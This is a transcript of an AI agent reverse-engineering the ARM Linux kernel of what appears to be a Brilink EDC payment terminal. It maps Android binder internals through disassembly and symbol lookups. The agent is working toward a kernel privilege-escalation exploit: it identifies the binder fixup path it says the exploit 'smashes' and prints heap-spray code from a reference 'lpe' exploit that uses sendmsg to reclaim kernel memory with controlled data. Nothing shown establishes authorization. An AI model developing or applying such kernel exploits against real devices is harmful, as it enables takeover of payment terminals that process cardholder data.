28
1072:static struct binder_node *binder_get_node_ilocked(struct binder_proc *proc,
static struct binder_node *binder_get_node_ilocked(struct binder_proc *proc,
						   binder_uintptr_t ptr)
{
	struct rb_node *n = proc->nodes.rb_node;
	struct binder_node *node;

	assert_spin_locked(&proc->inner_lock);

	while (n) {
		node = rb_entry(n, struct binder_node, rb_node);

		if (ptr < node->ptr)
			n = n->rb_left;
		else if (ptr > node->ptr)
			n = n->rb_right;
		else {
			/*
			 * take an implicit weak reference
			 * to ensure node stays alive until
			 * call to binder_put_node()
			 */
			binder_inc_node_tmpref_ilocked(node);
			return node;
		}
	}
	return NULL;
}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && sed -n '/^c0882a24/,/^c0882a68/p' tmp/m3/dis2_binder_new_node.txt"}

[tool • bash]
c0882a24  ldr	r6, [pc, #368]	@ 0xc0882b9c
c0882a28  add	r0, r6, #156	@ 0x9c
c0882a2c  pldw	[r0]
c0882a30  ldrex	r14, [r0]
c0882a34  add	lr, lr, #1
c0882a38  strex	sl, lr, [r0]
c0882a3c  teq	sl, #0
c0882a40  bne	0xc0882a30
c0882a44  ldr	r0, [r4, #52]	@ 0x34
c0882a48  str	r1, [r4, #20]
c0882a4c  mov	r1, ip
c0882a50  str	r3, [r4, #24]
c0882a54  add	r0, r0, #1
c0882a58  str	r3, [r4, #28]
c0882a5c  str	r0, [r4, #52]	@ 0x34
c0882a60  add	r0, r4, #20
c0882a64  str	r0, [r2]
c0882a68  bl	0xc0af35a0


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && python3 - <<'PYEOF'\nimport subprocess,bisect,re\nKS='tmp/m3/kallsyms_root.txt'; IMG='tmp/m3/zImage.bin'; BASE=0xc0008000\nsyms={}; addrs=[]\nfor ln in open(KS,errors='ignore'):\n    p=ln.split()\n    if len(p)>=3 and len(p[0])==8 and p[0].startswith(('c0','c1')):\n        try: va=int(p[0],16); syms[p[2]]=va; addrs.append(va)\n        except: pass\naddrs.sort()\ndef endof(va):\n    i=bisect.bisect_right(addrs,va)\n    return addrs[i] if i<len(addrs) and addrs[i]>va else va+0x800\ndata=open(IMG,'rb').read()\nimport os\nfn='binder_new_node'; va=syms[fn]; print(hex(va))\n# disasm raw and check literal pools at end (c0882b94-... region and 0x9c base)\nout=subprocess.run(['arm-none-eabi-objdump','-D','-b','binary','-marm','--adjust-vma=%#x'%va,'tmp/m3/slc_%s.bin'%fn],capture_output=True,text=True).stdout\nprint(out[-1800:])\nPYEOF"}

[tool • bash]
0xc088293c
82b00:	e2842008 	add	r2, r4, #8
c0882b04:	e5842008 	str	r2, [r4, #8]
c0882b08:	e584200c 	str	r2, [r4, #12]
c0882b0c:	e284204c 	add	r2, r4, #76	@ 0x4c
c0882b10:	e584204c 	str	r2, [r4, #76]	@ 0x4c
c0882b14:	e5842050 	str	r2, [r4, #80]	@ 0x50
c0882b18:	e59f2084 	ldr	r2, [pc, #132]	@ 0xc0882ba4
c0882b1c:	e5848044 	str	r8, [r4, #68]	@ 0x44
c0882b20:	e5922000 	ldr	r2, [r2]
c0882b24:	e3120a01 	tst	r2, #4096	@ 0x1000
c0882b28:	0a00000c 	beq	0xc0882b60
c0882b2c:	e1a0200d 	mov	r2, sp
c0882b30:	e3c21d7f 	bic	r1, r2, #8128	@ 0x1fc0
c0882b34:	e3c1103f 	bic	r1, r1, #63	@ 0x3f
c0882b38:	e51b2038 	ldr	r2, [fp, #-56]	@ 0xffffffc8
c0882b3c:	e591c00c 	ldr	ip, [r1, #12]
c0882b40:	e14b03d4 	ldrd	r0, [fp, #-52]	@ 0xffffffcc
c0882b44:	e58d9008 	str	r9, [sp, #8]
c0882b48:	e58d800c 	str	r8, [sp, #12]
c0882b4c:	e1cd00f0 	strd	r0, [sp]
c0882b50:	e59f0050 	ldr	r0, [pc, #80]	@ 0xc0882ba8
c0882b54:	e5921020 	ldr	r1, [r2, #32]
c0882b58:	e59c23f0 	ldr	r2, [ip, #1008]	@ 0x3f0
c0882b5c:	ebe4309f 	bl	0xc018ede0
c0882b60:	e1a05004 	mov	r5, r4
c0882b64:	e51b0038 	ldr	r0, [fp, #-56]	@ 0xffffffc8
c0882b68:	e3a01d16 	mov	r1, #1408	@ 0x580
c0882b6c:	ebffea7b 	bl	0xc087d560
c0882b70:	e1550004 	cmp	r5, r4
c0882b74:	0a000003 	beq	0xc0882b88
c0882b78:	e1a00004 	mov	r0, r4
c0882b7c:	ebe88e10 	bl	0xc02a63c4
c0882b80:	ea000000 	b	0xc0882b88
c0882b84:	e1a05004 	mov	r5, r4
c0882b88:	e1a00005 	mov	r0, r5
c0882b8c:	e24bd028 	sub	sp, fp, #40	@ 0x28
c0882b90:	e89daff0 	ldm	sp, {r4, r5, r6, r7, r8, r9, sl, fp, sp, pc}
c0882b94:	c1303d9c 	teqgt	r0, ip	@ <illegal shifter operand>
c0882b98:	014080c0 	smlalbteq	r8, r0, r0, r0
c0882b9c:	c136e25c 	teqgt	r6, ip, asr r2
c0882ba0:	c136f258 	teqgt	r6, r8, asr r2	@ <UNPREDICTABLE>
c0882ba4:	c1217798 			@ <UNDEFINED> instruction: 0xc1217798
c0882ba8:	c0e54970 	rscgt	r4, r5, r0, ror r9



[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && grep -E \" (d|D) binder_stats\" tmp/m3/kallsyms_root.txt; grep -E \"c1303d9c|c136e25c|c136f258\" tmp/m3/kallsyms_root.txt | head -5"}

[tool • bash]
c1303d9c B kmalloc_caches
c136e25c b binder_stats
c136f258 b binder_last_id


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && grep -E \" (d|D|b|B) (binder_proc_k|binder_node_)\" tmp/m3/kallsyms_root.txt | head -8; python3 - <<'PYEOF'\n# decode 0x014080c0: immediate for ldr r1, [pc,...] -> kmem_cache slot id\n# kmem_cache_alloc_trace(cache, gfp, size): r0=cache, r1=gfp, r2=size\n# ldr r0,[r3,#28]: r3 = &kmalloc_caches (c1303d9c), +28 = kmalloc_caches[7] (28/4 = index 7) => index 7 = 128B? arm32 KMALLOC_SHIFT_LOW=5? \nfor idx in range(0,12): print('kmalloc_caches[%d] at +0x%x'%(idx,idx*4))\nPYEOF"}

[tool • bash]
kmalloc_caches[0] at +0x0
kmalloc_caches[1] at +0x4
kmalloc_caches[2] at +0x8
kmalloc_caches[3] at +0xc
kmalloc_caches[4] at +0x10
kmalloc_caches[5] at +0x14
kmalloc_caches[6] at +0x18
kmalloc_caches[7] at +0x1c
kmalloc_caches[8] at +0x20
kmalloc_caches[9] at +0x24
kmalloc_caches[10] at +0x28
kmalloc_caches[11] at +0x2c


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && echo \"=== gfp imm decode 0x014080c0:\"; python3 -c \"\nimm=0x014080c0\n# rotated immediate\nrot=(imm>>8)&0xf; val=imm&0xff\nr=(32-(rot*2))%32\nprint('imm8=%#x rot=%d -> %#x'%(val,rot,((val>>r)|(val<<(32-r)))&0xffffffff))\n\"; echo \"=== who reads binder_stats fields: find in binder_new_node ldr r0 = cache c0882964: imm 0x014080c0 is for ldr at c0882964 (ldr r1) — actually ldr r0? check order\"; sed -n '/^c088295[0-9a-f]/,/^c088296e/p' tmp/m3/dis2_binder_new_node.txt"}

[tool • bash]
=== gfp imm decode 0x014080c0:
imm8=0xc0 rot=0 -> 0xc0
=== who reads binder_stats fields: find in binder_new_node ldr r0 = cache c0882964: imm 0x014080c0 is for ldr at c0882964 (ldr r1) — actually ldr r0? check order
c0882950  bl	0xc0110884
c0882954  ldr	r3, [pc, #568]	@ 0xc0882b94
c0882958  mov	r5, r1
c088295c  str	r0, [fp, #-56]	@ 0xffffffc8
c0882960  mov	r2, #88	@ 0x58
c0882964  ldr	r1, [pc, #556]	@ 0xc0882b98
c0882968  ldr	r0, [r3, #28]
c088296c  bl	0xc02a4d2c
c0882970  subs	r4, r0, #0
c0882974  beq	0xc0882b84
c0882978  ldr	r0, [fp, #-56]	@ 0xffffffc8
c088297c  movw	r1, #1406	@ 0x57e
c0882980  bl	0xc087d4ac
c0882984  ldr	r3, [fp, #-56]	@ 0xffffffc8
c0882988  cmp	r5, #0
c088298c  add	ip, r3, #12
c0882990  beq	0xc08829ac
c0882994  ldrd	r2, [r5, #8]
c0882998  ldr	r9, [r5, #16]
c088299c  ldr	r8, [r5, #20]
c08829a0  strd	r2, [fp, #-52]	@ 0xffffffcc
c08829a4  ldr	r5, [r5, #4]
c08829a8  b	0xc08829bc
c08829ac  mov	r9, #0
c08829b0  str	r9, [fp, #-52]	@ 0xffffffcc
c08829b4  mov	r8, r9
c08829b8  str	r9, [fp, #-48]	@ 0xffffffd0
c08829bc  ldr	r3, [fp, #-56]	@ 0xffffffc8
c08829c0  ldr	r3, [r3, #404]	@ 0x194
c08829c4  uxth	r2, r3
c08829c8  cmp	r2, r3, lsr #16
c08829cc  movne	r2, ip
c08829d0  movne	r1, #0
c08829d4  bne	0xc08829f8
c08829d8  udf	#18
c08829dc  ldrd	r0, [r3, #36]	@ 0x24
c08829e0  ldrd	r6, [fp, #-52]	@ 0xffffffcc
c08829e4  cmp	r7, r1
c08829e8  cmpeq	r6, r0
c08829ec  addcc	r2, r3, #8
c08829f0  bcs	0xc0882a08
c08829f4  mov	r1, r3
c08829f8  ldr	r3, [r2]
c08829fc  cmp	r3, #0
c0882a00  bne	0xc08829dc
c0882a04  b	0xc0882a24
c0882a08  addhi	r2, r3, #4
c0882a0c  bhi	0xc08829f4
c0882a10  ldr	r2, [r3, #32]
c0882a14  sub	r5, r3, #20
c0882a18  add	r2, r2, #1
c0882a1c  str	r2, [r3, #32]
c0882a20  b	0xc0882b64
c0882a24  ldr	r6, [pc, #368]	@ 0xc0882b9c
c0882a28  add	r0, r6, #156	@ 0x9c
c0882a2c  pldw	[r0]
c0882a30  ldrex	r14, [r0]
c0882a34  add	lr, lr, #1
c0882a38  strex	sl, lr, [r0]
c0882a3c  teq	sl, #0
c0882a40  bne	0xc0882a30
c0882a44  ldr	r0, [r4, #52]	@ 0x34
c0882a48  str	r1, [r4, #20]
c0882a4c  mov	r1, ip
c0882a50  str	r3, [r4, #24]
c0882a54  add	r0, r0, #1
c0882a58  str	r3, [r4, #28]
c0882a5c  str	r0, [r4, #52]	@ 0x34
c0882a60  add	r0, r4, #20
c0882a64  str	r0, [r2]
c0882a68  bl	0xc0af35a0
c0882a6c  dmb	ish
c0882a70  ldr	r2, [pc, #296]	@ 0xc0882ba0
c0882a74  pldw	[r2]
c0882a78  ldrex	r3, [r2]
c0882a7c  add	r3, r3, #1
c0882a80  strex	r1, r3, [r2]
c0882a84  teq	r1, #0
c0882a88  bne	0xc0882a78
c0882a8c  dmb	ish
c0882a90  ldr	r2, [fp, #-56]	@ 0xffffffc8
c0882a94  ldrd	r0, [fp, #-52]	@ 0xffffffcc
c0882a98  str	r3, [r4]
c0882a9c  str	r2, [r4, #32]
c0882aa0  mov	r2, #4
c0882aa4  str	r2, [r4, #16]
c0882aa8  ldrb	r2, [r4, #73]	@ 0x49
c0882aac  strd	r0, [r4, #56]	@ 0x38
c0882ab0  ubfx	r1, r5, #9, #2
c0882ab4  cmp	r1, #0
c0882ab8  cmpne	r1, #3
c0882abc  bfi	r2, r1, #0, #2
c0882ac0  strb	r2, [r4, #73]	@ 0x49
c0882ac4  sxtb	r2, r5
c0882ac8  addeq	r2, r2, #120	@ 0x78
c0882acc  rsbne	r2, r2, #99	@ 0x63
c0882ad0  strb	r2, [r4, #74]	@ 0x4a
c0882ad4  ubfx	r1, r5, #8, #1
c0882ad8  ldrb	r2, [r4, #73]	@ 0x49
c0882adc  str	r9, [r4, #64]	@ 0x40
c0882ae0  bfi	r2, r1, #3, #1
c0882ae4  ubfx	r1, r5, #11, #1
c0882ae8  bfi	r2, r1, #2, #1
c0882aec  ubfx	r5, r5, #12, #1
c0882af0  bfi	r2, r5, #4, #1
c0882af4  strb	r2, [r4, #73]	@ 0x49
c0882af8  mov	r2, #0
c0882afc  str	r2, [r4, #4]
c0882b00  add	r2, r4, #8
c0882b04  str	r2, [r4, #8]
c0882b08  str	r2, [r4, #12]
c0882b0c  add	r2, r4, #76	@ 0x4c
c0882b10  str	r2, [r4, #76]	@ 0x4c
c0882b14  str	r2, [r4, #80]	@ 0x50
c0882b18  ldr	r2, [pc, #132]	@ 0xc0882ba4
c0882b1c  str	r8, [r4, #68]	@ 0x44
c0882b20  ldr	r2, [r2]
c0882b24  tst	r2, #4096	@ 0x1000
c0882b28  beq	0xc0882b60
c0882b2c  mov	r2, sp
c0882b30  bic	r1, r2, #8128	@ 0x1fc0
c0882b34  bic	r1, r1, #63	@ 0x3f
c0882b38  ldr	r2, [fp, #-56]	@ 0xffffffc8
c0882b3c  ldr	ip, [r1, #12]
c0882b40  ldrd	r0, [fp, #-52]	@ 0xffffffcc
c0882b44  str	r9, [sp, #8]
c0882b48  str	r8, [sp, #12]
c0882b4c  strd	r0, [sp]
c0882b50  ldr	r0, [pc, #80]	@ 0xc0882ba8
c0882b54  ldr	r1, [r2, #32]
c0882b58  ldr	r2, [ip, #1008]	@ 0x3f0
c0882b5c  bl	0xc018ede0
c0882b60  mov	r5, r4
c0882b64  ldr	r0, [fp, #-56]	@ 0xffffffc8
c0882b68  mov	r1, #1408	@ 0x580
c0882b6c  bl	0xc087d560
c0882b70  cmp	r5, r4
c0882b74  beq	0xc0882b88
c0882b78  mov	r0, r4
c0882b7c  bl	0xc02a63c4
c0882b80  b	0xc0882b88
c0882b84  mov	r5, r4
c0882b88  mov	r0, r5
c0882b8c  sub	sp, fp, #40	@ 0x28
c0882b90  ldm	sp, {r4, r5, r6, r7, r8, r9, sl, fp, sp, pc}
c0882b94  teqgt	r0, ip	@ <illegal shifter operand>
c0882b98  smlalbteq	r8, r0, r0, r0
c0882b9c  teqgt	r6, ip, asr r2
c0882ba0  teqgt	r6, r8, asr r2	@ <UNPREDICTABLE>
c0882ba4  @ <UNDEFINED> instruction: 0xc1217798
c0882ba8  rscgt	r4, r5, r0, ror r9

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && grep -E \"c0e54970\" tmp/m3/kallsyms_root.txt | head -2; grep -E \"^\\S+ (t|T) binder_get_node_ilocked\" tmp/m3/kallsyms_root.txt; grep -E \" (d|D) _sdata\\b\" tmp/m3/kallsyms_root.txt"}

[tool • bash]
c087d7f4 t binder_get_node_ilocked
c1100000 D _sdata


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe && sed -n '/void setup_realloc_buffer/,/^}/p' src/realloc.c; sed -n '/void \\*realloc_thread/,/^}/p' src/realloc.c 2>/dev/null; grep -n \"NREALLOC\\|BUFSZ\\|barrier\\|RE_ALLOC\\|msg.msg\" src/realloc.c | head -20"}

[tool • bash]
void setup_realloc_buffer(void *content, size_t size)
{
   if (size <= 8)
      return;

   if (size > BUFSZ)
      size = BUFSZ;

   /* We need to skip the first 8 bytes, because otherwise, sendmsg will fail. */
   memcpy(realloc_buffer + 8, content + 8, size - 8);
	/* Unlock the realloc thread, let them copy the buffer. */
   realloc_barrier_wait();
}
void *realloc_thread(void *args)
{

   uint8_t buffer[BUFSZ + 1];
   struct realloc_thread *thread = (struct realloc_thread *)args;
   size_t size = thread->size;
   int cpu = thread->cpu;
	struct msghdr msg;
	struct iovec iov;
	memset(&iov, 0, sizeof(iov));
	memset(&msg, 0, sizeof(msg));

	pin_cpu(cpu);

	uint32_t pid = syscall(__NR_gettid);
	/* Exhaust the available socket window. */
	iov.iov_base = realloc_buffer;
	iov.iov_len = size;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	while (sendmsg(thread->pair[0], &msg, MSG_DONTWAIT) > 0);

	/* The next call will block. */
	msg.msg_control = realloc_buffer;
	msg.msg_controllen = size;

   /* Signal we have finished spawning. */

   thread->evicted = false;
   while (!thread->evicted) {

      //pthread_barrier_wait(&realloc_barrier);
      /* We're waiting here for the signal to copy the buffer data. */
      pthread_barrier_wait(&thread->barrier);


      memcpy(buffer, realloc_buffer, size);
      *(uint64_t *)(buffer + 0x60) =  pid;
      msg.msg_control = buffer;
      msg.msg_controllen = size;

      //pthread_barrier_wait(&realloc_barrier);
      /* We're waiting for the signal to block on the sendmsg syscall, and kmalloc() our
       * controlled data.
       */
      pthread_barrier_wait(&thread->barrier);
      syscall(__NR_sendmsg, thread->pair[0], &msg, 0);


      pthread_barrier_wait(&thread->barrier);

      /* And fill the socket queue once again. */
      while (sendmsg(thread->pair[0], &msg, MSG_DONTWAIT) > 0);
   }

   /* Wait for the exit signal. */

   pthread_barrier_wait(&thread->barrier);

   return NULL;
}
28:   pthread_barrier_t barrier;
31:uint8_t realloc_buffer[BUFSZ];
33:volatile struct realloc_thread threads[NREALLOC];
36:pthread_barrier_t realloc_barrier;
45:   uint8_t buffer[BUFSZ + 1];
60:	msg.msg_iov = &iov;
61:	msg.msg_iovlen = 1;
66:	msg.msg_control = realloc_buffer;
67:	msg.msg_controllen = size;
74:      //pthread_barrier_wait(&realloc_barrier);
76:      pthread_barrier_wait(&thread->barrier);
81:      msg.msg_control = buffer;
82:      msg.msg_controllen = size;
84:      //pthread_barrier_wait(&realloc_barrier);
88:      pthread_barrier_wait(&thread->barrier);
92:      pthread_barrier_wait(&thread->barrier);
100:   pthread_barrier_wait(&thread->barrier);
106: * Wait on the barrier, which will ultimately make the threads enter the
109:void realloc_barrier_wait(void)
113:   for (i = 0; i < NREALLOC; i++) {


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && cat tmp/m3/dis2_binder_validate_fixup.txt"}

[tool • bash]
c087e318  mov	ip, sp
c087e31c  push	{r4, r5, r6, r7, r8, r9, fp, ip, lr, pc}
c087e320  sub	fp, ip, #4
c087e324  sub	sp, sp, #64	@ 0x40
c087e328  push	{lr}		@ (str lr, [sp, #-4]!)
c087e32c  bl	0xc0110884
c087e330  ldr	r3, [pc, #208]	@ 0xc087e408
c087e334  mov	r8, r2
c087e338  mov	r6, r0
c087e33c  mov	r7, r1
c087e340  ldrd	r4, [fp, #28]
c087e344  ldr	r3, [r3]
c087e348  str	r3, [fp, #-40]	@ 0xffffffd8
c087e34c  ldrd	r2, [fp, #20]
c087e350  orrs	r3, r2, r3
c087e354  addne	r9, r0, #328	@ 0x148
c087e358  beq	0xc087e3e4
c087e35c  ldrd	r2, [fp, #20]
c087e360  ldrd	r0, [fp, #4]
c087e364  cmp	r3, r1
c087e368  cmpeq	r2, r0
c087e36c  beq	0xc087e3cc
c087e370  mov	r0, r6
c087e374  mov	r1, r7
c087e378  sub	r3, fp, #84	@ 0x54
c087e37c  bl	0xc087e110
c087e380  cmp	r0, #40	@ 0x28
c087e384  bne	0xc087e3e4
c087e388  ldr	r3, [fp, #-80]	@ 0xffffffb0
c087e38c  tst	r3, #1
c087e390  beq	0xc087e3e4
c087e394  ldr	r3, [fp, #-60]	@ 0xffffffc4
c087e398  mov	r2, #0
c087e39c  ldrd	r4, [fp, #-52]	@ 0xffffffcc
c087e3a0  mov	r0, r9
c087e3a4  add	r1, fp, #20
c087e3a8  add	r3, r8, r3, lsl #3
c087e3ac  adds	r4, r4, #4
c087e3b0  str	r3, [sp]
c087e3b4  mov	r3, #8
c087e3b8  stmib	sp, {r2, r3}
c087e3bc  mov	r2, r7
c087e3c0  adc	r5, r5, #0
c087e3c4  bl	0xc088b444
c087e3c8  b	0xc087e35c
c087e3cc  ldrd	r2, [fp, #12]
c087e3d0  cmp	r3, r5
c087e3d4  cmpeq	r2, r4
c087e3d8  movcs	r0, #1
c087e3dc  movcc	r0, #0
c087e3e0  b	0xc087e3e8
c087e3e4  mov	r0, #0
c087e3e8  ldr	r3, [pc, #24]	@ 0xc087e408
c087e3ec  ldr	r2, [fp, #-40]	@ 0xffffffd8
c087e3f0  ldr	r3, [r3]
c087e3f4  cmp	r2, r3
c087e3f8  beq	0xc087e400
c087e3fc  bl	0xc012b218
c087e400  sub	sp, fp, #36	@ 0x24
c087e404  ldm	sp, {r4, r5, r6, r7, r8, r9, fp, sp, pc}
c087e408  tstgt	r0, r8, lsl #4

[assistant]
<acp tokens="62" type="text" time="2026-11-15 11:00:11">m03978</acp>
All BFS mechanics are now fully mapped. One last source-level check — what value the driver rewrites into a `BINDER_TYPE_PTR` object's `buffer` field when copying sg data (this is what the fixup smashes), from the local 4.14 source I just pulled:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '/case BINDER_TYPE_PTR:/,/break;/p' 414_binder.c | head -60"}

[tool • bash]
	case BINDER_TYPE_PTR:
		object_size = sizeof(struct binder_buffer_object);
		break;
		case BINDER_TYPE_PTR:
			/*
			 * Nothing to do here, this will get cleaned up when the
			 * transaction buffer gets freed
			 */
			break;
		case BINDER_TYPE_PTR: {
			struct binder_buffer_object *bp =
				to_binder_buffer_object(hdr);
			size_t buf_left = sg_buf_end - sg_bufp;

			if (bp->length > buf_left) {
				binder_user_error("%d:%d got transaction with too large buffer\n",
						  proc->pid, thread->pid);
				return_error = BR_FAILED_REPLY;
				return_error_param = -EINVAL;
				return_error_line = __LINE__;
				goto err_bad_offset;
			}
			if (copy_from_user(sg_bufp,
					   (const void __user *)(uintptr_t)
					   bp->buffer, bp->length)) {
				binder_user_error("%d:%d got transaction with invalid offsets ptr\n",
						  proc->pid, thread->pid);
				return_error_param = -EFAULT;
				return_error = BR_FAILED_REPLY;
				return_error_line = __LINE__;
				goto err_copy_data_failed;
			}
			/* Fixup buffer pointer to target proc address space */
			bp->buffer = (uintptr_t)sg_bufp +
				binder_alloc_get_user_buffer_offset(
						&target_proc->alloc);
			sg_bufp += ALIGN(bp->length, sizeof(u64));

			ret = binder_fixup_parent(t, thread, bp, off_start,
						  offp - off_start,
						  last_fixup_obj,
						  last_fixup_min_off);
			if (ret < 0) {
				return_error = BR_FAILED_REPLY;
				return_error_param = ret;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
			last_fixup_obj = bp;
			last_fixup_min_off = 0;
		} break;
